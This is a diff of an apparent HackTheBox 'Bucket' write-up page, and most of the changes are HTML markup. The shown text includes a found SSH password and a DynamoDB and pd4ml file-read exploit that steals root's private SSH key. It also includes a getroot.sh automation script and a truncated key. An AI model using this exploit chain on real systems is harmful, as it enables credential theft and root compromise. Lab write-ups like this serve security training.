-</span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>+<span class="o">]</span> roy:n2vM-&lt;_K_Q:.Aa2 
-</span></span></code></pre></div><p>Now I can login into the system using <code>roy</code> credentials.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">SSH         10.10.10.212    <span class="m">22</span>     10.10.10.212     <span class="o">[</span>+<span class="o">]</span> roy:n2vM-&lt;_K_Q:.Aa2 </span></span></code></pre>
+</figure><p>Now I can login into the system using <code>roy</code> credentials.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ ssh roy@10.10.10.212
 </span></span><span class="line"><span class="cl">roy@10.10.10.212<span class="err">&#39;</span>s password: 
 </span></span><span class="line"><span class="cl">Welcome to Ubuntu 20.04 LTS <span class="o">(</span>GNU/Linux 5.4.0-48-generic x86_64<span class="o">)</span>
@@ -889,14 +957,15 @@
 </span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
 </span></span><span class="line"><span class="cl">roy@bucket:~$ id
 </span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>roy<span class="o">)</span>,1001<span class="o">(</span>sysadm<span class="o">)</span>
-</span></span><span class="line"><span class="cl">roy@bucket:~$ 
-</span></span></code></pre></div><p>The user flag is done here.</p>
+</span></span><span class="line"><span class="cl">roy@bucket:~$ </span></span></code></pre>
+</figure><p>The user flag is done here.</p>
 <p><div class="img-container"><img src="imgs/image-20210423013951765.png" alt="image-20210423013951765"  /></div>
 </p>
 <h3 id="shell-as-root">Shell as root</h3>
 <h4 id="enumeration-2">Enumeration</h4>
 <p>Running WinPEAS discovers another service currently running on port 8000.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Active Ports
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Active Ports
 </span></span><span class="line"><span class="cl">[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports                                                                                                 
 </span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                                     
 </span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:4566          0.0.0.0:*               LISTEN      -                   
@@ -904,16 +973,18 @@
 </span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN      -                   
 </span></span><span class="line"><span class="cl">tcp        0      0 127.0.0.1:46275         0.0.0.0:*               LISTEN      -                   
 </span></span><span class="line"><span class="cl">tcp6       0      0 :::80                   :::*                    LISTEN      -                   
-</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      - 
-</span></span></code></pre></div><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Readable files belonging to root and readable by me but not world readable
+</span></span><span class="line"><span class="cl">tcp6       0      0 :::22                   :::*                    LISTEN      - </span></span></code></pre>
+</figure><p>It also discovers that <code>bucket-app</code> in <code>/var/www/</code> is belong to the root user and readable to user <code>roy</code> but not to others.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] Readable files belonging to root and readable by me but not world readable
 </span></span><span class="line"><span class="cl">-rwxr-x---+ 1 root root 808729 Jun 10  2020 /var/www/bucket-app/pd4ml_demo.jar                                 
 </span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 358 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/README.md
 </span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 1085 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/LICENSE
 </span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 4689 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/UploadedFileInterface.php
-</span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php
-</span></span></code></pre></div><p>I can list the contents inside <code>bucket-app</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ ls -la
+</span></span><span class="line"><span class="cl">-rw-r-x---+ 1 root root 4746 Aug  6  2016 /var/www/bucket-app/vendor/psr/http-message/src/StreamInterface.php</span></span></code></pre>
+</figure><p>I can list the contents inside <code>bucket-app</code></p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ ls -la
 </span></span><span class="line"><span class="cl">total <span class="m">856</span>
 </span></span><span class="line"><span class="cl">drwxr-x---+  <span class="m">4</span> root root   <span class="m">4096</span> Feb <span class="m">10</span> 12:29 .
 </span></span><span class="line"><span class="cl">drwxr-xr-x   <span class="m">4</span> root root   <span class="m">4096</span> Feb <span class="m">10</span> 12:29 ..
@@ -922,9 +993,10 @@
 </span></span><span class="line"><span class="cl">drwxr-x---+  <span class="m">2</span> root root   <span class="m">4096</span> Apr <span class="m">22</span> 12:38 files
 </span></span><span class="line"><span class="cl">-rwxr-x---+  <span class="m">1</span> root root  <span class="m">17222</span> Sep <span class="m">23</span>  <span class="m">2020</span> index.php
 </span></span><span class="line"><span class="cl">-rwxr-x---+  <span class="m">1</span> root root <span class="m">808729</span> Jun <span class="m">10</span>  <span class="m">2020</span> pd4ml_demo.jar
-</span></span><span class="line"><span class="cl">drwxr-x---+ <span class="m">10</span> root root   <span class="m">4096</span> Feb <span class="m">10</span> 12:29 vendor
-</span></span></code></pre></div><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 
+</span></span><span class="line"><span class="cl">drwxr-x---+ <span class="m">10</span> root root   <span class="m">4096</span> Feb <span class="m">10</span> 12:29 vendor</span></span></code></pre>
+</figure><p>According to the Apache config file, the service on port 8000 is an internal website, and it is assigned to the root user. In other words, it is running as root.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">roy@bucket:~$ cat /etc/apache2/sites-available/000-default.conf 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;VirtualHost</span> <span class="err">127.0.0.1:8000</span><span class="nt">&gt;</span> # unknown
 </span></span><span class="line"><span class="cl">        <span class="nt">&lt;IfModule</span> <span class="err">mpm_itk_module</span><span class="nt">&gt;</span>
@@ -954,19 +1026,21 @@
 </span></span><span class="line"><span class="cl">        ErrorLog ${APACHE_LOG_DIR}/error.log
 </span></span><span class="line"><span class="cl">        CustomLog ${APACHE_LOG_DIR}/access.log combined
 </span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl"><span class="nt">&lt;/VirtualHost&gt;</span>
-</span></span></code></pre></div><h4 id="internal-web">Internal Web</h4>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/VirtualHost&gt;</span></span></span></code></pre>
+</figure><h4 id="internal-web">Internal Web</h4>
 <p>I&rsquo;ll expose the internal web to my localhost on the same port with SSH tunnel.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ ~C
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ ~C
 </span></span><span class="line"><span class="cl">ssh&gt; -L 8000:127.0.0.1:8000
 </span></span><span class="line"><span class="cl">Forwarding port.
-</span></span><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$
-</span></span></code></pre></div><p>The website page says the site is under construction.</p>
+</span></span><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$</span></span></code></pre>
+</figure><p>The website page says the site is under construction.</p>
 <p><div class="img-container"><img src="imgs/image-20210423015905604.png" alt="image-20210423015905604"  /></div>
 </p>
 <h4 id="source-code-review">Source Code Review</h4>
 <p>Upon reviewing the <code>index.php</code>, I found out that this website can be abused.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ cat index.php 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app$ cat index.php 
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">&lt;?php
 </span></span><span class="line"><span class="cl">require <span class="s1">&#39;vendor/autoload.php&#39;</span><span class="p">;</span>
@@ -997,9 +1071,10 @@
 </span></span><span class="line"><span class="cl"><span class="k">else</span>
 </span></span><span class="line"><span class="cl"><span class="o">{</span>
 </span></span><span class="line"><span class="cl">?&gt;
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><p>When there is a POST request contains data of <code>action=get_alerts</code>, the following snippet creates a connection to DynamoDB.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...</span></span></code></pre>
+</figure><p>When there is a POST request contains data of <code>action=get_alerts</code>, the following snippet creates a connection to DynamoDB.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&#34;REQUEST_METHOD&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;POST&#34;</span><span class="p">)</span> <span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;action&#34;</span><span class="p">]</span><span class="o">===</span><span class="s2">&#34;get_alerts&#34;</span><span class="p">)</span> <span class="p">{</span> <span class="c1"># POST action=get_alerts 
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nx">date_default_timezone_set</span><span class="p">(</span><span class="s1">&#39;America/New_York&#39;</span><span class="p">);</span>
 </span></span><span class="line"><span class="cl">                <span class="nv">$client</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">DynamoDbClient</span><span class="p">([</span>  <span class="c1"># Connect to DynamoDB.
@@ -1007,31 +1082,36 @@
 </span></span><span class="line"><span class="cl">                        <span class="s1">&#39;region&#39;</span>  <span class="o">=&gt;</span> <span class="s1">&#39;us-east-1&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">                        <span class="s1">&#39;version&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;latest&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">                        <span class="s1">&#39;endpoint&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;http://localhost:4566&#39;</span>
-</span></span><span class="line"><span class="cl">                <span class="p">]);</span>
-</span></span></code></pre></div><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p>
+</span></span><span class="line"><span class="cl">                <span class="p">]);</span></span></span></code></pre>
+</figure><p>It then reads every item in table <code>alerts</code> and filters out the result only to the one that contains string value of “Ransomware” (the key).</p>
 <blockquote>
 <p>DynamoDB is key-value NoSQL database.</p>
 </blockquote>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="na">getIterator</span><span class="p">(</span><span class="s1">&#39;Scan&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="c1"># Read content from table alerts
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$iterator</span> <span class="o">=</span> <span class="nv">$client</span><span class="o">-&gt;</span><span class="na">getIterator</span><span class="p">(</span><span class="s1">&#39;Scan&#39;</span><span class="p">,</span> <span class="k">array</span><span class="p">(</span> <span class="c1"># Read content from table alerts
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="s1">&#39;TableName&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;alerts&#39;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">       <span class="s1">&#39;FilterExpression&#39;</span> <span class="o">=&gt;</span> <span class="s2">&#34;title = :title&#34;</span><span class="p">,</span> <span class="c1"># Filter by title
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>       <span class="s1">&#39;ExpressionAttributeValues&#39;</span> <span class="o">=&gt;</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;:title&#34;</span><span class="o">=&gt;</span><span class="k">array</span><span class="p">(</span><span class="s2">&#34;S&#34;</span><span class="o">=&gt;</span><span class="s2">&#34;Ransomware&#34;</span><span class="p">)),</span>
-</span></span><span class="line"><span class="cl"><span class="p">));</span>
-</span></span></code></pre></div><p>For each result from the previous snippet, it writes the result value (<code>$item[“data”]</code>) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>  <span class="c1"># 
+</span></span><span class="line"><span class="cl"><span class="p">));</span></span></span></code></pre>
+</figure><p>For each result from the previous snippet, it writes the result value (<code>$item[“data”]</code>) of &ldquo;Ransomware&rdquo; to a randomly named HTML file.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$iterator</span> <span class="k">as</span> <span class="nv">$item</span><span class="p">)</span> <span class="p">{</span>  <span class="c1"># 
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$name</span><span class="o">=</span><span class="nx">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">10000</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;.html&#39;</span><span class="p">;</span> <span class="c1"># Generate randomnumber.html 
 </span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nx">file_put_contents</span><span class="p">(</span><span class="s1">&#39;files/&#39;</span><span class="o">.</span><span class="nv">$name</span><span class="p">,</span><span class="nv">$item</span><span class="p">[</span><span class="s2">&#34;data&#34;</span><span class="p">]);</span> <span class="c1"># Write contents to randomnumber.html
-</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
-</span></span></code></pre></div><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">passthru</span><span class="p">(</span><span class="s2">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="si">$name</span><span class="s2"> 800 A4 -out files/result.pdf&#34;</span><span class="p">);</span> <span class="c1"># convert randomnumber.html to result.pdf
-</span></span></span></code></pre></div><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p>
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span></span></span></code></pre>
+</figure><p>The HTML file then gets converted into a PDF file (<code>result.pdf</code>) using <code>pd4ml</code>.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">passthru</span><span class="p">(</span><span class="s2">&#34;java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/</span><span class="si">$name</span><span class="s2"> 800 A4 -out files/result.pdf&#34;</span><span class="p">);</span> <span class="c1"># convert randomnumber.html to result.pdf
+</span></span></span></code></pre>
+</figure><p>From the enumeration above on the DynamoDB, I know there is no table called <code>alerts</code>.</p>
 <p>The idea is, if I have a control over the <code>alerts</code> table as well as the write and read operations on the table, then I can abuse this web application to read almost any file on the system* (arbitrary file read).</p>
 <blockquote>
 <p>*The web application is currently running as root</p>
 </blockquote>
 <h4 id="obtain-root-ssh-key">Obtain root SSH Key</h4>
 <p>First I’ll try to create a dummy table on the database. I’ll be using JSON format and save it to a file called <code>test-table.json</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">	<span class="nt">&#34;TableName&#34;</span><span class="p">:</span> <span class="s2">&#34;iamf&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">	<span class="nt">&#34;AttributeDefinitions&#34;</span><span class="p">:</span> 
 </span></span><span class="line"><span class="cl">	<span class="p">[</span>
@@ -1043,9 +1123,10 @@
 </span></span><span class="line"><span class="cl">	<span class="p">],</span>
 </span></span><span class="line"><span class="cl">	<span class="nt">&#34;ProvisionedThroughput&#34;</span> <span class="p">:</span> 
 </span></span><span class="line"><span class="cl">		<span class="p">{</span> <span class="nt">&#34;WriteCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="nt">&#34;ReadCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">10</span> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and supply the JSON file on it.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>Now I can use the subcommand <code>create-table</code> with <code>--cli-input-json</code> option and supply the JSON file on it.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws dynamodb create-table --cli-input-json file://test-table.json --endpoint-url  http://s3.bucket.htb
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">{</span>
@@ -1065,9 +1146,10 @@
 </span></span><span class="line"><span class="cl">        <span class="o">]</span>,
 </span></span><span class="line"><span class="cl">        <span class="s2">&#34;TableStatus&#34;</span>: <span class="s2">&#34;ACTIVE&#34;</span>,
 </span></span><span class="line"><span class="cl">        <span class="s2">&#34;CreationDateTime&#34;</span>: <span class="s2">&#34;2021-04-22T15:22:33.634000-04:00&#34;</span>,
-</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span></code></pre></div><p>Using the subcommand <code>list-tables</code>, I can confirm that the table has been created. I also notice that I can insert items into this table.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+</span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...</span></span></code></pre>
+</figure><p>Using the subcommand <code>list-tables</code>, I can confirm that the table has been created. I also notice that I can insert items into this table.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ aws dynamodb list-tables --endpoint-url http://s3.bucket.htb
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">{</span>
@@ -1075,10 +1157,11 @@
 </span></span><span class="line"><span class="cl">        <span class="s2">&#34;iamf&#34;</span>,
 </span></span><span class="line"><span class="cl">        <span class="s2">&#34;users&#34;</span>
 </span></span><span class="line"><span class="cl">    <span class="o">]</span>
-</span></span><span class="line"><span class="cl"><span class="o">}</span>
-</span></span></code></pre></div><p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p>
+</span></span><span class="line"><span class="cl"><span class="o">}</span></span></span></code></pre>
+</figure><p>Knowing this, now I can create the <code>alerts</code> table. I’ll write it on JSON format as well.</p>
 <p><code>alert-table.json</code>:</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">        <span class="nt">&#34;TableName&#34;</span><span class="p">:</span> <span class="s2">&#34;alerts&#34;</span><span class="p">,</span>
 </span></span><span class="line"><span class="cl">        <span class="nt">&#34;AttributeDefinitions&#34;</span><span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="p">[</span>
@@ -1092,17 +1175,19 @@
 </span></span><span class="line"><span class="cl">        <span class="p">],</span>
 </span></span><span class="line"><span class="cl">        <span class="nt">&#34;ProvisionedThroughput&#34;</span> <span class="p">:</span>
 </span></span><span class="line"><span class="cl">        <span class="p">{</span><span class="nt">&#34;WriteCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">5</span><span class="p">,</span> <span class="nt">&#34;ReadCapacityUnits&#34;</span><span class="p">:</span> <span class="mi">10</span><span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment&gt;</code> tags. The tags can be used to embed a file [<a href="https://pd4ml.com/html.htm"target="_blank" rel="noopener noreferrer"
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>Now to abuse the application for file read, I’ll put the root SSH key path within <code>&lt;pd4ml:attachment&gt;</code> tags. The tags can be used to embed a file [<a href="https://pd4ml.com/html.htm"target="_blank" rel="noopener noreferrer"
 >source</a>]. I&rsquo;ll write it on JSON format and name it as <code>payload.json</code></p>
 <p><code>payload.json</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-json" data-lang="json"><span class="line"><span class="cl"><span class="p">{</span>
 </span></span><span class="line"><span class="cl">	<span class="nt">&#34;title&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;Ransomware&#34;</span> <span class="p">},</span> 
 </span></span><span class="line"><span class="cl">    <span class="nt">&#34;data&#34;</span><span class="p">:</span> <span class="p">{</span> <span class="nt">&#34;S&#34;</span><span class="p">:</span> <span class="s2">&#34;&lt;pd4ml:attachment&gt;file:///root/.ssh/id_rsa&lt;/pd4ml:attachment&gt;&#34;</span> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="p">}</span>
-</span></span></code></pre></div><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre>
+</figure><p>And finally, I’ll use a bash script to perform the execution, this is because there is a clean up script on the box. I’ll name the script as <code>getroot.sh</code>.</p>
 <p><code>getroot.sh</code></p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="cp">#!/bin/bash
 </span></span></span><span class="line"><span class="cl"><span class="cp"></span>
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Create table&#34;</span>
 </span></span><span class="line"><span class="cl">aws dynamodb create-table --cli-input-json file://alerts-table.json --endpoint-url<span class="o">=</span>http://s3.bucket.htb &gt;/dev/null
@@ -1111,14 +1196,16 @@
 </span></span><span class="line"><span class="cl">aws dynamodb put-item --table-name alerts --item file://insert.json --endpoint-url<span class="o">=</span>http://s3.bucket.htb &gt;/dev/null
 </span></span><span class="line"><span class="cl">sleep 0.5
 </span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;[+] Send get alerts&#34;</span>
-</span></span><span class="line"><span class="cl">curl -svd <span class="s2">&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span class="c1"># The port 8000 on Bucket forwarded to localhost:8000</span>
-</span></span></code></pre></div><blockquote>
+</span></span><span class="line"><span class="cl">curl -svd <span class="s2">&#34;action=get_alerts&#34;</span> http://127.0.0.1:8000/ <span class="c1"># The port 8000 on Bucket forwarded to localhost:8000</span></span></span></code></pre>
+</figure><blockquote>
 <p>The script assume all the required files are stored in the same folder.</p>
 </blockquote>
 <p>I’ll watch the <code>result.pdf</code> at <code>/var/www/bucket/files</code> and grab the SSH key using <code>roy</code>’s session.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app/files$ <span class="k">while</span> sleep 2<span class="p">;</span> <span class="k">do</span> sed -n <span class="s1">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
-</span></span></code></pre></div><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app/files$ <span class="k">while</span> sleep 2<span class="p">;</span> <span class="k">do</span> sed -n <span class="s1">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span></span></span></code></pre>
+</figure><p>Now I can just execute the <code>getroot.sh</code> script and wait for it to complete.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">→ root@iamf «bucket» «10.10.14.39» 
 </span></span><span class="line"><span class="cl">$ ./getroot.sh  
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Create table
@@ -1142,22 +1229,25 @@
 </span></span><span class="line"><span class="cl">&lt; Content-Length: <span class="m">0</span>
 </span></span><span class="line"><span class="cl">&lt; Content-Type: text/html<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>UTF-8
 </span></span><span class="line"><span class="cl">&lt; 
-</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span>
-</span></span></code></pre></div><p>On <code>roy</code> shell, I can see it the SSH key.</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app/files$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sed -n <span class="s1">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
+</span></span><span class="line"><span class="cl">* Connection <span class="c1">#0 to host 127.0.0.1 left intact</span></span></span></code></pre>
+</figure><p>On <code>roy</code> shell, I can see it the SSH key.</p>
+<figure class="highlight">
+    <pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">roy@bucket:/var/www/bucket-app/files$ <span class="k">while</span> sleep 1<span class="p">;</span> <span class="k">do</span> sed -n <span class="s1">&#39;/^-----BEGIN OPENSSH PRIVATE KEY-----$/,/^-----END OPENSSH PRIVATE KEY-----$/p&#39;</span> * 2&gt;/dev/null<span class="p">;</span> <span class="k">done</span>
 </span></span><span class="line"><span class="cl">
 </span></span><span class="line"><span class="cl">-----BEGIN OPENSSH PRIVATE KEY-----
 </span></span><span class="line"><span class="cl">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
 </span></span><span class="line"><span class="cl">...&lt;SNIP&gt;...
-</span></span><span class="line"><span class="cl">-----END OPENSSH PRIVATE KEY-----
